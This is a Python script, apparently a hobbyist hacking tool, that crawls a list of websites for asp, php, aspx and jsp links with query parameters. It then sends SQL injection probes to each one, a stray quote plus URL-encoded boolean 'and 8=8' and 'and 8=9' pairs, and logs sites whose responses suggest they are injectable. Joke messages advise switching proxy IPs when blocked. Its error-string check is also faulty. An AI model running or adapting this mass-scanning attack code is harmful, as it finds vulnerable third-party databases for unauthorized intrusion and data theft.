#coding = utf-8
#__author = h4ckg3h2y1 for python3
#nano urllists.txt sql_url
import re
import requests
import time
from bs4 import BeautifulSoup as asp
import random
import os
time.sleep(8)
headeraa = {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)',}
zhaohan = open('mINJlogo.txt','a+')
zhaohan8 = open('INJ.txt','a+')
huixian1 = "is not a valid MySQL result resource"
huixian2 = "ODBC SQL Server Driver"
huixian3 = "Warning:ociexecute"
huixian4 = "Warning: pq_query[function.pg-query]"
huixian5 = "You have an error in your SQL syntax"
huixian6 = "Database Engine"
huixian7 = "Undefined variable"
huixian8 = "on line"
hansb = open('urllist.txt','r')
hanssb = hansb.readlines()
hansb.close()
ttzh = str(time.ctime())
zhzhzh = open('url.txt','a+')
for urllists in hanssb:
    urllistx = urllists.strip('\n')
    print(urllistx)
    time.sleep(3)
    try:
        sss5 = []
        bingasp = []
        bingphp = []
        bingaspx = []
        bingjsp = []
        han = requests.get(url=urllistx,headers=headeraa,timeout=10)
        print(han.status_code)
        print('Waiting...........................')
        soup = asp(han.content)
        hrefs = soup.find_all(href=re.compile(r'asp\?'))
        for href in hrefs:
            href = href.get('href')
            if 'http' in href:
                bingasp.append(href)
            else:
                sss5.append(href)
 
                
        hrefs = soup.find_all(href=re.compile(r'php\?'))
        for href in hrefs:
            href = href.get('href')
            if 'http' in href:
                bingphp.append(href)
            else:
                sss5.append(href)
 
                
        hrefs = soup.find_all(href=re.compile(r'aspx\?'))
        for href in hrefs:
            href = href.get('href')
            if 'http' in href:
                bingaspx.append(href)
            else:
                sss5.append(href)
 
                
        hrefs = soup.find_all(href=re.compile(r'jsp\?'))
        for href in hrefs:
            href = href.get('href')
            if 'http' in href:
                bingjsp.append(href)
            else:
                sss5.append(href)
    except:
        print('connect time out')
    finally:
            try:
                bingphp1 = bingphp[0:3]
                for bingphp2 in bingphp1:
                                         zhzhzh.write(bingphp2 + '\n')
                bingaspx1 = bingaspx[0:3]
                for bingaspx2 in bingaspx1:
                                         zhzhzh.write(bingaspx2 + '\n')
                bingasp1 = bingasp[0:3]
                for bingasp2 in bingasp1:
                                         zhzhzh.write(bingasp2 + '\n')
                bingjsp1 = bingjsp[0:3]
                for bingjsp2 in bingjsp1:
                                         zhzhzh.write(bingjsp2 + '\n')
                sss4 = random.sample(sss5,4)
                for sss3 in sss4:
                                 zhzhzh.write(urllistx + sss3 + '\n')
            except:
                print('rxxr')
zhzhzh.close()
zhaohan1 = open('url.txt','r')
zhaohan2 = zhaohan1.readlines()
zhaohan1.close()
zhaohan.write('-------------------------------------------------LOGO-------------------------------------------------' + '\n')
headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER'}
def attack(urlx):
    payload0 = urlx + "'"
    try:
        r1 = requests.get(url = payload0,headers=headers,allow_redirects = False,timeout = 6)
        if r1.status_code == 200:
                print(str("********************开始第一重扫描验证********************",'gbk'))
                time.sleep(1)
        if huixian1 or huixian2 or huixian3 or huixian4 or huixian5 or huixian6 or huixian7 or huixian8 in str(r1.content):
            print(str("[+]单引号显错注入启动.......",'gbk'))
            print(r1.status_code)
            print(r1.headers)
            time.sleep(1)
            print(str("[+]尝试在页面中寻找可能出现的数据库报错语句......",'gbk'))
            time.sleep(1)
            print(r1.content)
            zhaohan.write('第一重验证通过：   ' + payload0 + ' ' + ttzh + '\n')
        if r1.status_code != 200:
                print(str("[+]页面被跳转或页面发生错误，不能检测是否存在注入...",'gbk'))
    except:
        print(str('''
            该网站已经无法正常访问，重复以下步骤即可轻松解决:
         1.拔掉网线
         2.连上邻居老王家的WIFI
         3.轻轻抚弄路由器
         4.切换代理IP
         5.重复以上步骤并站起来做一套全国人民广播体操
        ''','gbk'))
        time.sleep(2)
    print(str("=====================第一重扫描已扫描完毕=====================",'gbk'))
    time.sleep(1)
    
def attack2(urlx):
    payload0 = urlx + "%20%61%4e%64%20%38%3d%38"
    global att2s
    global att2c
    try:
        r2 = requests.get(url = payload0,headers=headers,allow_redirects = False,timeout = 6)
        if r2.status_code == 200:
                print(str("********************开始第二重扫描验证********************",'gbk'))
                time.sleep(1)
        if huixian1 or huixian2 or huixian3 or huixian4 or huixian5 or huixian6 or huixian7 or huixian8 in str(r2.content):
            print(str("[+]同数字型显错注入启动.......",'gbk'))
            print(r2.status_code)
            print(r2.headers)
            att2s = r2.status_code
            att2c = r2.content
            time.sleep(1)
            print(str("[+]尝试在页面中寻找可能出现的数据库报错语句......",'gbk'))
            time.sleep(1)
            print(r2.content)
            zhaohan.write('第二重验证通过：   ' + payload0 + ' ' + ttzh + '\n')
        if r2.status_code != 200:
                print(str("[+]页面被跳转或页面发生错误，不能检测是否存在注入...",'gbk'))
    except:
        print(str('''
            该网站已经无法正常访问，重复以下步骤即可轻松解决:
         1.拔掉网线
         2.连上邻居老王家的WIFI
         3.轻轻抚弄路由器
         4.切换代理IP
         5.重复以上步骤并站起来做一套全国人民广播体操
        ''','gbk'))
        time.sleep(2)
    print(str("=====================第二重扫描已扫描完毕=====================",'gbk'))
    time.sleep(1)
 
def attack3(urlx):
    payload0 = urlx + "%20%61%4e%64%20%38%3d%39"
    global att3s
    global att3c
    try:
        r3 = requests.get(url = payload0,headers=headers,allow_redirects = False,timeout = 6)
        if r3.status_code == 200:
                print(str("********************开始第三重扫描验证********************",'gbk'))
                time.sleep(1)
        if huixian1 or huixian2 or huixian3 or huixian4 or huixian5 or huixian6 or huixian7 or huixian8 in str(r3.content):
            print(str("[+]异数字型显错注入启动.......",'gbk'))
            print(r3.status_code)
            print(r3.headers)
            att3s = r3.status_code
            att3c = r3.content
            time.sleep(1)
            print(str("[+]尝试在页面中寻找可能出现的数据库报错语句......",'gbk'))
            time.sleep(1)
            print(r3.content)
            zhaohan.write('第三重验证通过：   ' + payload0 + ' ' + ttzh + '\n')
        if r3.status_code != 200:
                print(str("[+]页面被跳转或页面发生错误，不能检测是否存在注入...",'gbk'))
    except:
        print(str('''
            该网站已经无法正常访问，重复以下步骤即可轻松解决:
         1.拔掉网线
         2.连上邻居老王家的WIFI
         3.轻轻抚弄路由器
         4.切换代理IP
         5.重复以上步骤并站起来做一套全国人民广播体操
        ''','gbk'))
        time.sleep(2)
    print(str("=====================第三重扫描已扫描完毕=====================",'gbk'))
    time.sleep(1)
 
def attack4(urlx):
    payload0 = urlx + "%%20%27%20%61%4e%64%20%27%38%27%3d%27%38"
    global att4s
    global att4c
    try:
        r4 = requests.get(url = payload0,headers=headers,allow_redirects = False,timeout = 6)
        if r4.status_code == 200:
                print(str("********************开始第四重扫描验证********************",'gbk'))
                time.sleep(1)
        if huixian1 or huixian2 or huixian3 or huixian4 or huixian5 or huixian6 or huixian7 or huixian8 in str(r4.content):
            print(str("[+]同字符串显错注入启动.......",'gbk'))
            print(r4.status_code)
            print(r4.headers)
            att4s = r4.status_code
            att4c = r4.content
            time.sleep(1)
            print(str("[+]尝试在页面中寻找可能出现的数据库报错语句......",'gbk'))
            time.sleep(1)
            print(r4.content)
            zhaohan.write('第四重验证通过：   ' + payload0 + ' ' + ttzh + '\n')
        if r4.status_code != 200:
                print(str("[+]页面被跳转或页面发生错误，不能检测是否存在注入...",'gbk'))
    except:
        print(str('''
            该网站已经无法正常访问，重复以下步骤即可轻松解决:
         1.拔掉网线
         2.连上邻居老王家的WIFI
         3.轻轻抚弄路由器
         4.切换代理IP
         5.重复以上步骤并站起来做一套全国人民广播体操
        ''','gbk'))
        time.sleep(2)
    print(str("=====================第四重扫描已扫描完毕=====================",'gbk'))
    time.sleep(1)
 
def attack5(urlx):
    payload0 = urlx + "%20%27%20%61%4e%64%20%27%38%27%3d%27%39"
    global att5s
    global att5c
    try:
        r5 = requests.get(url = payload0,headers=headers,allow_redirects = False,timeout = 6)
        if r5.status_code == 200:
                print(str("********************开始第五重扫描验证********************",'gbk'))
                time.sleep(1)
        if huixian1 or huixian2 or huixian3 or huixian4 or huixian5 or huixian6 or huixian7 or huixian8 in str(r5.content):
            print(str("[+]异字符串显错注入启动.......",'gbk'))
            print(r5.status_code)
            print(r5.headers)
            att5s = r5.status_code
            att5c = r5.content
            time.sleep(1)
            print(str("[+]尝试在页面中寻找可能出现的数据库报错语句......",'gbk'))
            time.sleep(1)
            print(r5.content)
            zhaohan.write('第五重验证通过：   ' + payload0 + ' ' + ttzh + '\n')
        if r5.status_code != 200:
                print(str("[+]页面被跳转或页面发生错误，不能检测是否存在注入...",'gbk'))
    except:
        print(str('''
            该网站已经无法正常访问，重复以下步骤即可轻松解决:
         1.拔掉网线
         2.连上邻居老王家的WIFI
         3.轻轻抚弄路由器
         4.切换代理IP
         5.重复以上步骤并站起来做一套全国人民广播体操
        ''','gbk'))
        time.sleep(2)
    print(str("=====================第五重扫描已扫描完毕=====================",'gbk'))
    time.sleep(1)
    try:
        if int(att2s) == int(att3s) == 200 and str(att2c) != str(att3c):
            zhaohan8.write(urlx + '\n')
        if int(att4s) == int(att5s) == 200 and str(att4c) != str(att5c):
                zhaohan8.write(urlx + '\n')
    except:
        print('none')
        pass
for ios in zhaohan2:
    urlx = ios.strip('\n')
    attack(urlx)
    attack2(urlx)
    attack3(urlx)
    attack4(urlx)
    attack5(urlx)
zhaohan8.close()
zhaohan.close()
os.remove('url.txt')
